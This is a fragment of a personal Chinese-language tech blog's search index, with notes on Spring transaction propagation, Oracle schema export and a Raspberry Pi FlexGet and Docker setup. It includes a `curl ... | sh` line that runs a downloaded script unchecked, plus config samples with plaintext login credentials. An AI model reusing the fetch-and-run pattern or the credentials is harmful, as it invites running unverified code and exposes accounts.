","date":"2020-09-06","objectID":"/blog/posts/Hibernate-%E5%92%8C-Spring-Boot-JPA-%E5%81%9A-Transactional-%E4%B8%8D%E4%B8%80%E6%A8%A3-session-close-%E6%99%82%E6%A9%9F/:3:0","tags":["hibernate","transactional","jpa","spring"],"title":"Hibernate 和 Spring Boot JPA 做 @Transactional 不一樣 session.close 時機","uri":"/blog/posts/Hibernate-%E5%92%8C-Spring-Boot-JPA-%E5%81%9A-Transactional-%E4%B8%8D%E4%B8%80%E6%A8%A3-session-close-%E6%99%82%E6%A9%9F/"},{"categories":["Oracle"],"content":"最近公司專案需要建制某環境 Table Schema 但是現有工具沒辦法做到大量匯出Table 後來 Google 好用的工具 ","date":"2020-09-03","objectID":"/blog/posts/Oracle-%E5%8C%AF%E5%87%BA-Schema-%E5%A5%BD%E7%94%A8%E5%B7%A5%E5%85%B7/:0:0","tags":["oracle","db2"],"title":"Oracle 匯出 Schema 好用工具","uri":"/blog/posts/Oracle-%E5%8C%AF%E5%87%BA-Schema-%E5%A5%BD%E7%94%A8%E5%B7%A5%E5%85%B7/"},{"categories":["Oracle"],"content":"scheme2ddl qwazer/scheme2ddl: Command line util for export oracle schema to set of ddl scripts java -jar scheme2ddl-2.4.3-SNAPSHOT.jar -url DB_USERID/DB_PASSWORD:@Oracle_IP:1521:DBNAME -o D:/temp/ 執行速度非常快!! ","date":"2020-09-03","objectID":"/blog/posts/Oracle-%E5%8C%AF%E5%87%BA-Schema-%E5%A5%BD%E7%94%A8%E5%B7%A5%E5%85%B7/:1:0","tags":["oracle","db2"],"title":"Oracle 匯出 Schema 好用工具","uri":"/blog/posts/Oracle-%E5%8C%AF%E5%87%BA-Schema-%E5%A5%BD%E7%94%A8%E5%B7%A5%E5%85%B7/"},{"categories":["Oracle"],"content":"其他看到工具 MySQL 就沒找了，現成 phpmyadmin 都可以做到 不過，剛剛有發現看起來好用工具k0kubun/sqldef: Idempotent MySQL/PostgreSQL schema management by SQL 之前有紀錄這些工具快速產生資料表 alter table 語法 schemalex | 程式狂想筆記 DB2 剛好有看到qwazer/db2-scheme2ddl: Command line util for export IBM DB2 schema to set of ddl scripts 不過我就沒測試了 qwazer/db2-table2sql ","date":"2020-09-03","objectID":"/blog/posts/Oracle-%E5%8C%AF%E5%87%BA-Schema-%E5%A5%BD%E7%94%A8%E5%B7%A5%E5%85%B7/:2:0","tags":["oracle","db2"],"title":"Oracle 匯出 Schema 好用工具","uri":"/blog/posts/Oracle-%E5%8C%AF%E5%87%BA-Schema-%E5%A5%BD%E7%94%A8%E5%B7%A5%E5%85%B7/"},{"categories":["Linux"],"content":"簡單小記 Linux 程式抓取Timezone流程 ​ Linux —— 时间（tzselect、timedatactl命令，查看和修改时区，修改时区为东八区）_杰儿__er 的博客-CSDN博客 ​ 預設會抓Linux TZ 環境變數，如果不存在，就會抓取/etc/localtime 注意這個不是單純txt，會用 linux link 方式去做連結的 所以可以ls - l /etc/localtime 看到指定的語系 echo $TZ; ls -al /etc/localtime 還可以用指令看 datetimectl 可以看目前使用語系 就這麼簡單 ​ ​ 其他小記 https://linuxhint.com/linux_date_command/ HTTP日期/时间格式 - 簡書 Python 時間/時區處理 | CKPlus’s Blog ","date":"2020-08-31","objectID":"/blog/posts/Linux-%E7%A8%8B%E5%BC%8F%E6%8A%93%E5%8F%96Timezone%E6%B5%81%E7%A8%8B/:0:0","tags":["linux","timezone"],"title":"Linux 程式抓取Timezone流程","uri":"/blog/posts/Linux-%E7%A8%8B%E5%BC%8F%E6%8A%93%E5%8F%96Timezone%E6%B5%81%E7%A8%8B/"},{"categories":["Java"],"content":"最近接觸 Spring 專案搭配使用 Hibernate 後來想到應該是Spring-Tx 但是使用上常常處理事務跟我想要的結果不一樣 這個沒有研究清楚，常常事務那邊會一直卡住 最近剛好查到資料，這邊整理一下吧 一個@Transaction哪裡來這麼多坑？ - 程序員DMZ - 博客園 備份圖 玩转Spring —— 消失的事务 - 知乎 備份圖 ","date":"2020-08-27","objectID":"/blog/posts/Hibernate-%E4%BA%A4%E6%98%93%E4%BA%8B%E5%8B%99%E5%A4%B1%E6%95%88/:0:0","tags":["hibernate","transactional"],"title":"Spring 交易事務失效","uri":"/blog/posts/Hibernate-%E4%BA%A4%E6%98%93%E4%BA%8B%E5%8B%99%E5%A4%B1%E6%95%88/"},{"categories":["Java"],"content":"主要原因 最近有時候發現交易沒有生效 最近翻到這篇文章 原來需要注意這個部分 這兩篇寫得很棒 簡單總結一下 上圖簡單說明，使用 Transactional 會用代理模式開啟 DB 事務 但為什麼第一層 Transactional 方法呼叫同個類別(Class)的方法會沒有新開事務呢 會看到代理(Proxy)類別呼叫第二層是呼叫到原本的(不是 Proxy)類別的 method 所以…當然就沒有代理 這時候在想要怎麼新開獨立事務 第一篇寫得很清楚 玩轉Spring —— 消失的事務 - 知乎 這篇文章就是講剛剛的問題，但沒有講要怎麼解決，最後我找到一篇有說要怎麼解決 一個@Transaction哪裡來這麼多坑？ - 程序員DMZ - 博客園業務代碼層面這邊有程式碼例子，並且解決方法 第二個例子 @Service public class DmzService { @Transactional public void save(A a, B b) { saveB(b); } @Transactional(propagation = Propagation.REQUIRES_NEW) public void saveB(B b){ dao.saveB(a); } } 兩個@Transactional，saveB 不會新開事務 我覺得這個跟第一個原因很像 因為 AOP 代理 第一層做，但是this.saveB 會抓到原本類別 saveB method 之前學 Spring 有聽過一個口訣，@Transactional 會抓外面優先執行 這邊注意遺下優先抓外面，但邏輯是比較有沒有交易連線 REQUIRES_NEW 會抓建立新的連線機制 可以看一下交易事務:Spring事務傳播行為詳解 - 個人文章 - SegmentFault 思否 最近也有查到@Transactional class和 method，會優先抓 method 的@Transactional 沒使用 public method 也會失敗，原因是 AOP 的方法需要 public 要做事務處理建議使用 XXX.save() 這邊 XXX 是指 Spring 注入的對象 這跟下面解決方式一樣 Spring默認拋出了未檢查unchecked異常（繼承自 RuntimeException 的異常）或者 Error才回滾事務；其他異常不會觸發回滾事務，已經執行的SQL會提交掉。如果在事務中拋出其他類型的異常，但卻期望 Spring 能夠回滾事務，就需要指定 rollbackFor屬性。 這邊之後有時間在探討這個問題，這篇只先記錄事務處理 問題來了，這些要怎麼解決? ","date":"2020-08-27","objectID":"/blog/posts/Hibernate-%E4%BA%A4%E6%98%93%E4%BA%8B%E5%8B%99%E5%A4%B1%E6%95%88/:1:0","tags":["hibernate","transactional"],"title":"Spring 交易事務失效","uri":"/blog/posts/Hibernate-%E4%BA%A4%E6%98%93%E4%BA%8B%E5%8B%99%E5%A4%B1%E6%95%88/"},{"categories":["Java"],"content":"解決 一個@Transaction哪裡來這麼多坑？ - 程序員DMZ - 博客園下免有兩個方法 自己注入自己 所有 AOP 需要特別建立事務，需要用這個方法比較不會遇到問題 @Service public class DmzService { // 自己注入自己 @Autowired DmzService dmzService; @Transactional public void save(A a, B b) { dmzService.saveB(b); } @Transactional(propagation = Propagation.REQUIRES_NEW) public void saveB(B b){ dao.saveB(a); } } 正規方法 @Service public class DmzService { @Transactional public void save(A a, B b) { ((DmzService) AopContext.currentProxy()).saveB(b); } @Transactional(propagation = Propagation.REQUIRES_NEW) public void saveB(B b){ dao.saveB(a); } } 詳細看這兩篇，解決我在 Spring 交易事務的疑惑 沒這兩篇的話，我可能就無法還技術債 ","date":"2020-08-27","objectID":"/blog/posts/Hibernate-%E4%BA%A4%E6%98%93%E4%BA%8B%E5%8B%99%E5%A4%B1%E6%95%88/:2:0","tags":["hibernate","transactional"],"title":"Spring 交易事務失效","uri":"/blog/posts/Hibernate-%E4%BA%A4%E6%98%93%E4%BA%8B%E5%8B%99%E5%A4%B1%E6%95%88/"},{"categories":["Java"],"content":"相關交易處理 這邊也說得很細 Spring 中的事務傳播 - 個人文章 - SegmentFault 思否 希望我有時間再整理這些差別 最近在想有什麼方法可以看到交易事務處理狀態 原本有找到用 Wireshark 抓封包看 看完這篇應該是不需要了 :) Hibernate 有時起事務會失敗，外層加 @Transactional 就能解決 這邊就放起個小彩蛋連結(我就不整理了) hibernate cascade 的坑 | 头头带你飞 Hibernate4整合spring4報錯—-No Session found for current thread - IT閱讀 Spring+Hibernate No Session found for current thread异常分析_老王不让用的博客-CSDN博客 Spring 中的事務傳播 - 個人文章 - SegmentFault 思否 终于解决了：No Session found for current thread_lijing_lj928的专栏-CSDN博客 程序员DMZ - 博客园 sprin 事务注解@Transactional的实现原理（转） - myseries - 博客园 技术分享 | 从 wireshark 看 MySQL 8.0 加密连接 - 简书 MySQL_通过binlog查看原始SQL语句 - 掘金 jquery 高效实现htmlencode()与htmldecode()函数_jackhuclan的专栏-CSDN博客 Showing a Spring transaction in log4j_王奕然的博客-CSDN博客 2021-08-02 有看到比較完整介紹交易文章。詳細瞭解 Spring Transaction 的 Propagation 備份圖 ","date":"2020-08-27","objectID":"/blog/posts/Hibernate-%E4%BA%A4%E6%98%93%E4%BA%8B%E5%8B%99%E5%A4%B1%E6%95%88/:3:0","tags":["hibernate","transactional"],"title":"Spring 交易事務失效","uri":"/blog/posts/Hibernate-%E4%BA%A4%E6%98%93%E4%BA%8B%E5%8B%99%E5%A4%B1%E6%95%88/"},{"categories":["實用工具"],"content":"之前有寫過malagege/sqlMakecsv: for a sqltocsv package easy sample 嚴格說是我改別人 code 改寫 簡單陽春寫出 sql 連 MySQL(或 Golang 有支援的DB Driver) 轉 csv, Excel 注意: 撈出幾百萬資料可能會造成記憶體吃光光 可能需要手動分別撈出來 ","date":"2020-08-24","objectID":"/blog/posts/sql-%E5%8C%AF%E5%87%BAcsv-Excel-%E5%B7%A5%E5%85%B7/:0:0","tags":["sql","csv","excel"],"title":"sql 匯出csv ,Excel 工具","uri":"/blog/posts/sql-%E5%8C%AF%E5%87%BAcsv-Excel-%E5%B7%A5%E5%85%B7/"},{"categories":["實用工具"],"content":"自己寫的工具 malagege/sqlMakecsv: for a sqltocsv package easy sample 最近公司環境 DB 是用 Oracle 我當初寫沒有塞 Oracle Driver 最後有查到兩個方式 gdbc/wrapper at master · identitii/gdbc OJDBC (GDBC) 但 Windows WSL 編譯失敗 中途發現它編譯還需要改 pom.xml 的 http → https 裡面有 native-image 指令 後來發現需要裝GraalVM 介紹 + 安裝教學 好險 sdkman 可以搞定這一切 不過後來排除各種問題 還是失敗 沒有在 Linux 環境安裝 所以有空再試試 編譯出來還是失敗 Error: Classes that should be initialized at run time got initialized during image building: java.sql.DriverManager was unintentionally initialized at build time. To see why java.sql.DriverManager got initialized use -H:+TraceClassInitialization com.oracle.svm.core.util.UserError$UserException: Classes that should be initialized at run time got initialized during image building: java.sql.DriverManager was unintentionally initialized at build time. To see why java.sql.DriverManager got initialized use -H:+TraceClassInitialization at com.oracle.svm.core.util.UserError.abort(UserError.java:68) at com.oracle.svm.hosted.classinitialization.ConfigurableClassInitialization.checkDelayedInitialization(ConfigurableClassInitialization.java:526) at com.oracle.svm.hosted.classinitialization.ClassInitializationFeature.duringAnalysis(ClassInitializationFeature.java:227) at com.oracle.svm.hosted.NativeImageGenerator.lambda$runPointsToAnalysis$8(NativeImageGenerator.java:732) at com.oracle.svm.hosted.FeatureHandler.forEachFeature(FeatureHandler.java:70) 這邊有 OJDBC 8 解決方法，但我看 GDBC 好像是用 6 不過我不是很熟，所以就沒繼續研究 https://github.com/quarkusio/quarkus/issues/1658#issuecomment-523618130 原生 Oracle 連線 oci8 Oracle Instant Client Downloads | Oracle 台灣 不過不想再 window 上面安裝東西 在 WSL 他又認得是 Window 所以放棄這個方案 Oracle 目前還是不能匯出 有空再做測試處理 最後還是放棄測試，因為可能就算可以執行 程式搬到別台但腦能不能跑也是一個問題 ","date":"2020-08-24","objectID":"/blog/posts/sql-%E5%8C%AF%E5%87%BAcsv-Excel-%E5%B7%A5%E5%85%B7/:1:0","tags":["sql","csv","excel"],"title":"sql 匯出csv ,Excel 工具","uri":"/blog/posts/sql-%E5%8C%AF%E5%87%BAcsv-Excel-%E5%B7%A5%E5%85%B7/"},{"categories":["實用工具"],"content":"export2excel tinywall/export2excel: Export Mysql/Oracle Data to Excel CSV 在 Github 看到有人寫好的好用工具 這個就能使用 OJDBC 成功連到 Oracle 可以解決我現階段撈出報表問題 這邊要設定 Run.bat set path=“C:\\Program Files\\Java\\jdk1.7.0_25\\bin” 如果是在 Linux 記得要調整 # window #javac -d classes -classpath lib\\jdom-1.0.jar;lib\\poi-3.0-rc4-20070503.jar;lib\\ojdbc14.jar;lib\\mysql-connector-java-5.1.6.jar; src/*.java # Linux # classpath 要改成 / # -jar 分號記得要改成冒號 : javac -d classes -classpath lib/jdom-1.0.jar:lib/poi-3.0-rc4-20070503.jar:lib/ojdbc14.jar:lib/mysql-connector-java-5.1.6.jar src/*.java CLOB 記得要轉乘 TO_CHAR 裡面程式沒有做 CLOB 處理 ","date":"2020-08-24","objectID":"/blog/posts/sql-%E5%8C%AF%E5%87%BAcsv-Excel-%E5%B7%A5%E5%85%B7/:2:0","tags":["sql","csv","excel"],"title":"sql 匯出csv ,Excel 工具","uri":"/blog/posts/sql-%E5%8C%AF%E5%87%BAcsv-Excel-%E5%B7%A5%E5%85%B7/"},{"categories":["Linux"],"content":"在樹莓派安裝 flexget 通常要裝 python 3.5以上 更新系統flexget壞掉啦!! | 程式狂想筆記 雖然這篇有小記 但最近我看官方安裝方法有點不太一樣 這邊小記安裝紀錄 文章在2023年有重新安裝 Flexget，作法跟這篇不太一樣，可以參考2023年樹莓派重裝 Flexget - 程式狂想筆記。 ","date":"2020-08-11","objectID":"/blog/posts/%E5%9C%A8%E6%A8%B9%E6%A2%85%E6%B4%BE%E5%AE%89%E8%A3%9D-flexget/:0:0","tags":["flexget","linux"],"title":"在樹莓派安裝 flexget","uri":"/blog/posts/%E5%9C%A8%E6%A8%B9%E6%A2%85%E6%B4%BE%E5%AE%89%E8%A3%9D-flexget/"},{"categories":["Linux"],"content":"安裝 flexget ","date":"2020-08-11","objectID":"/blog/posts/%E5%9C%A8%E6%A8%B9%E6%A2%85%E6%B4%BE%E5%AE%89%E8%A3%9D-flexget/:1:0","tags":["flexget","linux"],"title":"在樹莓派安裝 flexget","uri":"/blog/posts/%E5%9C%A8%E6%A8%B9%E6%A2%85%E6%B4%BE%E5%AE%89%E8%A3%9D-flexget/"},{"categories":["Linux"],"content":"安裝 Pytnon 3.8 apt 無法取得 所以需要手動編譯 Python How to install Python 3.8 on Raspberry Pi (Raspbian) - installvirtual sudo apt-get update sudo apt-get install -y build-essential tk-dev libncurses5-dev libncursesw5-dev libreadline6-dev libdb5.3-dev libgdbm-dev libsqlite3-dev libssl-dev libbz2-dev libexpat1-dev liblzma-dev zlib1g-dev libffi-dev tar wget vim # 下載 Python wget https://www.python.org/ftp/python/3.8.0/Python-3.8.0.tgz # 安裝 Python # 這過程會很久，我使用 PI 1 ，安裝大概快一整天才好，建議使用 tmux 安裝，以免關掉需要重來 sudo tar zxf Python-3.8.0.tgz cd Python-3.8.0 sudo ./configure --enable-optimizations sudo make -j 4 sudo make altinstall # 檢查 python3.8 -V # 修改 default 3.8 ，也可以不用做，直接輸入 python3.8 echo \"alias python=/usr/local/bin/python3.8\" \u003e\u003e ~/.bashrc source ~/.bashrc # clean sudo rm -rf Python-3.8.0.tgz sudo rm -rf Python-3.8.0 ","date":"2020-08-11","objectID":"/blog/posts/%E5%9C%A8%E6%A8%B9%E6%A2%85%E6%B4%BE%E5%AE%89%E8%A3%9D-flexget/:1:1","tags":["flexget","linux"],"title":"在樹莓派安裝 flexget","uri":"/blog/posts/%E5%9C%A8%E6%A8%B9%E6%A2%85%E6%B4%BE%E5%AE%89%E8%A3%9D-flexget/"},{"categories":["Linux"],"content":"另外一種安裝 Python 發現有另外一種方式安裝 Python 3.8 Install Python 3.8.1 on Raspberry Pi (Raspbian) - installvirtual 已經安裝過了 我就不測試這個方法 但下次可能會試試看 # apt sudo apt-get update sudo apt-get install -y build-essential tk-dev libncurses5-dev libncursesw5-dev libreadline6-dev libdb5.3-dev libgdbm-dev libsqlite3-dev libssl-dev libbz2-dev libexpat1-dev liblzma-dev zlib1g-dev libffi-dev tar wget vim # pyenv git clone https://github.com/pyenv/pyenv.git ~/.pyenv echo 'export PYENV_ROOT=\"$HOME/.pyenv\"' \u003e\u003e ~/.bashrc \u0026\u0026 echo 'export PATH=\"$PYENV_ROOT/bin:$PATH\"' \u003e\u003e ~/.bashrc source ~/.bashrc pyenv install 3.8.1 pyenv versions 方法感覺更簡單 ","date":"2020-08-11","objectID":"/blog/posts/%E5%9C%A8%E6%A8%B9%E6%A2%85%E6%B4%BE%E5%AE%89%E8%A3%9D-flexget/:1:2","tags":["flexget","linux"],"title":"在樹莓派安裝 flexget","uri":"/blog/posts/%E5%9C%A8%E6%A8%B9%E6%A2%85%E6%B4%BE%E5%AE%89%E8%A3%9D-flexget/"},{"categories":["Linux"],"content":"安裝 flexget 參考FlexGet這篇 使用 virtualenv 還滿有趣的 記錄一下 Supported versions of Python: 3.6, 3.7 3.8 (untested, but should work) 官方建議安裝版本 不過我沒注意安裝 3.8 但是測試可以執行 # virtualenv python3 -m venv ~/.flexget/ # 推薦大家改.flexget 因為這樣設定 service 比較不會麻煩 # Install FlexGet in the virtualenv cd ~/.flexget/ bin/pip install flexget # Running FlexGet from the virtualenv source ~/.flexget/bin/activate # flexget ~/.flexget/bin/flexget [options] # 全局安裝 # sudo pip install flexget config.yml 要先設定在 flexget 資料夾才能這常執行 安裝 transmissionrpc ~/flexget/bin/pip3 install transmissionrpc # 假如跑出錯誤Transmissionrpc module version 0.11 or higher required # 就是少了安裝這個 最下面有比較潮的設定 docker 後來有對 config 做調整 web_server: yes templates: default: transmission: host: 192.168.1.203 port: 9091 username: admin password: userpwd add_paused: no path: /mnt/extHDD/Download/Mikata/201901/{{task}} free_space: path: /mnt/extHDD/ space: 1000 clean_transmission: host: localhost port: 9091 username: admin password: userpwd finished_for: 4 days min_ratio: 1 if: - \"'季度全集' in category\": reject olddownload: transmission: host: 192.168.1.203 port: 9091 username: malagege password: malagegeinnfu add_paused: no path: /mnt/extHDD/Download/Mikata/201810/{{task}} free_space: path: /mnt/extHDD/ space: 1000 clean_transmission: host: localhost port: 9091 username: admin password: admin finished_for: 4 days min_ratio: 1 if: - \"'季度全集' in category\": reject autoPass: transmission: host: 192.168.1.203 port: 9091 username: admin password: admin add_paused: yes path: /mnt/extHDD/Download/Mikata/201810/{{task}} if: - \"'季度全集' in category\": reject tasks: 刀劍神域 Alicization: rss: url: https://share.dmhy.org/topics/rss/sort_id/2/rss.xml?keyword=刀劍神域 Alicization+悠哈璃羽字幕社＆拉斯观测组+CHT other_fields: [category] accept_all: yes template: autoPass schedules: # Run every 30 minutes on monday - tasks: \"*\" schedule: hour: \"*/3\" ","date":"2020-08-11","objectID":"/blog/posts/%E5%9C%A8%E6%A8%B9%E6%A2%85%E6%B4%BE%E5%AE%89%E8%A3%9D-flexget/:1:3","tags":["flexget","linux"],"title":"在樹莓派安裝 flexget","uri":"/blog/posts/%E5%9C%A8%E6%A8%B9%E6%A2%85%E6%B4%BE%E5%AE%89%E8%A3%9D-flexget/"},{"categories":["Linux"],"content":"執行 WebUI 介面 FlexGet # 設定 web 密碼，切記要很嚴謹密碼 flexget web passwd \u003csome_password\u003e # 背景執行程式 flexget daemon start --daemonize WebUI config 可線上修改config.yml 而且還有除錯功能!!非常簡單!! http://ip:5050 user:flexget pwd: (自己設定) 這邊 task 需要執行成功一次後 才會出現!!! 注意這邊控制 flexget 需要再 flexget 資料夾路徑 cd ~/flexget ~/flexget/bin/flexget daemon stop ~/flexget/bin/flexget daemon start --daemon # 2020-08-11 22:10:37 CRITICAL manager Failed to find configuration file config.yml # 2020-08-11 22:10:37 INFO manager Tried to read from: /home/pi, /home/pi/.flexget, /home/pi/.config/flexget ","date":"2020-08-11","objectID":"/blog/posts/%E5%9C%A8%E6%A8%B9%E6%A2%85%E6%B4%BE%E5%AE%89%E8%A3%9D-flexget/:1:4","tags":["flexget","linux"],"title":"在樹莓派安裝 flexget","uri":"/blog/posts/%E5%9C%A8%E6%A8%B9%E6%A2%85%E6%B4%BE%E5%AE%89%E8%A3%9D-flexget/"},{"categories":["Linux"],"content":"其他 ","date":"2020-08-11","objectID":"/blog/posts/%E5%9C%A8%E6%A8%B9%E6%A2%85%E6%B4%BE%E5%AE%89%E8%A3%9D-flexget/:2:0","tags":["flexget","linux"],"title":"在樹莓派安裝 flexget","uri":"/blog/posts/%E5%9C%A8%E6%A8%B9%E6%A2%85%E6%B4%BE%E5%AE%89%E8%A3%9D-flexget/"},{"categories":["Linux"],"content":"flexget service /lib/systemd/system/flexget.service 下面路徑需要調整 我是放在/etc/systemd/system/flexget.service [Unit] Description=Flexget Daemon After=network.target [Service] Type=simple User=pi ExecStart= /home/pi/.flexget/bin/flexget daemon start ExecStop= /home/pi/.flexget/bin/flexget daemon stop ExecReload= /home/pi/.flexget/bin/flexget daemon reload [Install] WantedBy=multi-user.target sudo systemctl daemon-reload systemctl 直接 enable/disable rclone 掛載硬碟小記 | 程式狂想筆記 這裡面之前有紀錄 systemctl ","date":"2020-08-11","objectID":"/blog/posts/%E5%9C%A8%E6%A8%B9%E6%A2%85%E6%B4%BE%E5%AE%89%E8%A3%9D-flexget/:2:1","tags":["flexget","linux"],"title":"在樹莓派安裝 flexget","uri":"/blog/posts/%E5%9C%A8%E6%A8%B9%E6%A2%85%E6%B4%BE%E5%AE%89%E8%A3%9D-flexget/"},{"categories":["Linux"],"content":"docker 執行 flexget ","date":"2020-08-11","objectID":"/blog/posts/%E5%9C%A8%E6%A8%B9%E6%A2%85%E6%B4%BE%E5%AE%89%E8%A3%9D-flexget/:3:0","tags":["flexget","linux"],"title":"在樹莓派安裝 flexget","uri":"/blog/posts/%E5%9C%A8%E6%A8%B9%E6%A2%85%E6%B4%BE%E5%AE%89%E8%A3%9D-flexget/"},{"categories":["Linux"],"content":"安裝 docker curl -sSL https://get.docker.com/ | sh sudo usermod -aG docker pi # 重新登入 sudo systemctl restart docker sudo systemctl enable docker ","date":"2020-08-11","objectID":"/blog/posts/%E5%9C%A8%E6%A8%B9%E6%A2%85%E6%B4%BE%E5%AE%89%E8%A3%9D-flexget/:3:1","tags":["flexget","linux"],"title":"在樹莓派安裝 flexget","uri":"/blog/posts/%E5%9C%A8%E6%A8%B9%E6%A2%85%E6%B4%BE%E5%AE%89%E8%A3%9D-flexget/"},{"categories":["Linux"],"content":"docker 執行 flexget 之前這邊有寫過Raspberry Pi 使用 Docker 架設 flexget | 程式狂想筆記 後來就沒繼續使用(因為我不太會用) PI 要裝 Python 編譯比較花時間 在想有沒有比較快的方法 pi 1 請使用 arm32v6 ，其他代請使用 armv7 FROM arm32v7/python:3.8.5-alpine MAINTAINER bren RUN apk add --update \\ tzdata \\ ca-certificates \\ \u0026\u0026 pip install --no-cache-dir --disable-pip-version-check flexget transmissionrpc \\ \u0026\u0026 rm -rf /var/cache/apk/* # Copy local files COPY files/ / # add default volumes VOLUME /config /data WORKDIR /config # expose port for flexget webui EXPOSE 3539 3539/tcp # run init.sh to set uid, gid, permissions and to launch flexget RUN chmod +x /scripts/init.sh CMD [\"/scripts/init.sh\"] docker build . -t malagege/flexget id pi可以看當下 user id docker run -d \\ --name=flexget \\ -restart=always \\ -p 5050:5050 \\ # 注意 port -v \"$PWD/data\":/data \\ -v \"$PWD/config\":/config \\ -e FG_WEBUI_PASSWD=__複雜密碼__ \\ # -e /mnt/xxx:/mnt/xxx 有使用 free_space 要開這個 # -e PUID=1000 \\ # -e PGID=1000 \\ -e TZ=\"Asia/Taipei\" \\ malagege/flexget docker參數–restart=always的作用 - 開始認識 - 博客園 docker參數–restart=always的作用 創建容器時沒有添加參數 –restart=always ，導致的後果是：當 Docker 重啟時，容器未能自動啟動 1、Docker 命令修改 docker container update –restart=always 容器名字 FlexGet ","date":"2020-08-11","objectID":"/blog/posts/%E5%9C%A8%E6%A8%B9%E6%A2%85%E6%B4%BE%E5%AE%89%E8%A3%9D-flexget/:3:2","tags":["flexget","linux"],"title":"在樹莓派安裝 flexget","uri":"/blog/posts/%E5%9C%A8%E6%A8%B9%E6%A2%85%E6%B4%BE%E5%AE%89%E8%A3%9D-flexget/"},{"categories":["Linux"],"content":"bitbucket CI/CD 檢查設定 因為這個我有跟我朋友一起改設定檔 所以我有加了 CI/CD 防止修改錯誤 image: nikolaik/python-nodejs:python3.8-nodejs12 pipelines: default: - step: script: # Modify the commands below to build your repository. - npm install -g yaml-lint - yamllint config.yml # - npm install # - npm test - pip install --no-cache-dir --disable-pip-version-check flexget - flexget -V - flexget check 2018-02-14 10:28 WARNING manager Config line XX is likely missing ‘:’ at the end 是 bug 所以先不用理會 參考:FLexget使用记录 - linkthis blog ","date":"2020-08-11","objectID":"/blog/posts/%E5%9C%A8%E6%A8%B9%E6%A2%85%E6%B4%BE%E5%AE%89%E8%A3%9D-flexget/:4:0","tags":["flexget","linux"],"title":"在樹莓派安裝 flexget","uri":"/blog/posts/%E5%9C%A8%E6%A8%B9%E6%A2%85%E6%B4%BE%E5%AE%89%E8%A3%9D-flexget/"},{"categories":["Linux"],"content":"Git 同步方法 最後更改需要執行docker exec flexget flexget daemon reload-config 載入最新設定檔案 #!/bin/bash cd /home/pi/flexget-arm/config \u0026\u0026 git fetch origin master LOCAL_COMMITID=$(git rev-parse HEAD) echo \"LCOAL_COMMITID=${LOCAL_COMMITID}\" REMOTE_COMMITID=$(git rev-parse origin/master) echo \"REMOTE_COMMITID=${REMOTE_COMMITID}\" if [ \"$LOCAL_COMMITID\" != \"$REMOTE_COMMITID\" ] then echo \"COMMITID不一致，需做同步\" git reset origin/master --hard \u0026\u0026 docker exec flexget flexget daemon reload-config fi ","date":"2020-08-11","objectID":"/blog/posts/%E5%9C%A8%E6%A8%B9%E6%A2%85%E6%B4%BE%E5%AE%89%E8%A3%9D-flexget/:4:1","tags":["flexget","linux"],"title":"在樹莓派安裝 flexget","uri":"/blog/posts/%E5%9C%A8%E6%A8%B9%E6%A2%85%E6%B4%BE%E5%AE%89%E8%A3%9D-flexget/"},{"categories":["Linux"],"content":"手動執行排程 docker exec flexget flexget execute --tasks \"TV-*\" config.yml web_server: yes templates: default: transmission: host: 192.168.1.203 port: 9091 username: admin password: admin add_paused: no path: /mnt/extHDD/Download/Mikata/TV/{{task}} free_space: path: /mnt/extHDD/ space: 1000 clean_transmission: host: 192.168.1.203 port: 9091 username: admin password: admin finished_for: 60 days min_ratio: 1 if: - \"'季度全集' in category\": reject autoPass: transmission: host: 192.168.1.203 port: 9091 username: admin password: admin add_paused: yes path: /mnt/extHDD/Download/Mikata/autoPass/{{task}} if: - \"'季度全集' in category\": reject tasks: \"TV-刀劍神域 Alicization\": rss: url: https://share.dmhy.org/topics/rss/sort_id/2/rss.xml?keyword=刀劍神域+悠哈璃羽字幕社＆拉斯观测组+CHT other_fields: [category] accept_all: yes template: default transmission: path: /mnt/extHDD/Download/Mikata/TV/202007/{{task[3:]}} schedules: - tasks: \"TV-*\" schedule: day_of_week: mon,tue,wed,thu,fri,sat,sun hour: \"3,5,8,11,13,15,17,20\" jitter: 60 這邊有發現 WebUI 用 GMT 時間 非本地時間…，但怎麼找設定都沒看到程式可以調整台灣時區 ","date":"2020-08-11","objectID":"/blog/posts/%E5%9C%A8%E6%A8%B9%E6%A2%85%E6%B4%BE%E5%AE%89%E8%A3%9D-flexget/:4:2","tags":["flexget","linux"],"title":"在樹莓派安裝 flexget","uri":"/blog/posts/%E5%9C%A8%E6%A8%B9%E6%A2%85%E6%B4%BE%E5%AE%89%E8%A3%9D-flexget/"},{"categories":["Linux"],"content":"最近公司上板 Java 排程程式都會遇到亂碼 ???? 這個都不能手動執行 今天解決這個問題 整理一下 首先，簡單講一下 我們 jenkins 上板程式是透過 ssh 打指令操作 這邊我備註一下，我們公司上板 Java 程式，是排程程式，這些排程不是使用 Crontab 方式去執行 所以這邊執行都是透過 shell 腳本方式去重複執行 有在家目錄使用socure ~/.profile 但是這個過程 奇怪的是 locale 查看出來的 LC_CTYPE=en_US.UTF8 其他都是 POSIX 一般用 Xshell 登入是 locale 全看到 en_US.UTF8 這邊我還不確定是什麼原因? non-interactive + non-login shell 最後一種模式為非交互非登陸的shell，創建這種shell典型有兩種方式： bash script.sh ssh user@remote command 這兩種都是創建一個shell，執行完腳本之後便退出，不再需要與用戶交互。 ssh連接遠程主機執行腳本的環境變量問題_whitehack的專欄-CSDN博客_ssh 遠程執行命令 含變量 備份圖 目前看到這篇有疑似這個問題 所以導致登入環境變數會有不一樣結果 我也沒看到有設定 BASH_ENV 參數 不過確實因為 ssh remote command 登入 造就登入不一樣結果 裡面有滿清楚內容ssh連接遠程主機執行腳本的環境變量問題_whitehack的專欄-CSDN博客_ssh 遠程執行命令 含變量、關於 Linux 下 Bash 與 Zsh 啟動檔的載入順序研究 | The Will Will Web +—————-+——–+———–+—————+ | | login |interactive|non-interactive| | | |non-login |non-login | +—————-+——–+———–+—————+ |/etc/profile | A | | | +—————-+——–+———–+—————+ |/etc/bash.bashrc| | A | | +—————-+——–+———–+—————+ |~/.bashrc | | B | | +—————-+——–+———–+—————+ |~/.bash_profile | B1 | | | +—————-+——–+———–+—————+ |~/.bash_login | B2 | | | +—————-+——–+———–+—————+ |~/.profile | B3 | | | +—————-+——–+———–+—————+ |BASH_ENV | | | A | +—————-+——–+———–+—————+ \u003e \u003e 配置文件建議 \u003e \u003e 回顧一下前面提到的所有配置文件，總共有以下幾種： \u003e \u003e /etc/profile \u003e ~/.bash_profile \u003e ~/.bash_login \u003e ~/.profile \u003e /etc/bash.bashrc \u003e ~/.bashrc \u003e $BASH_ENV \u003e $ENV \u003e \u003e 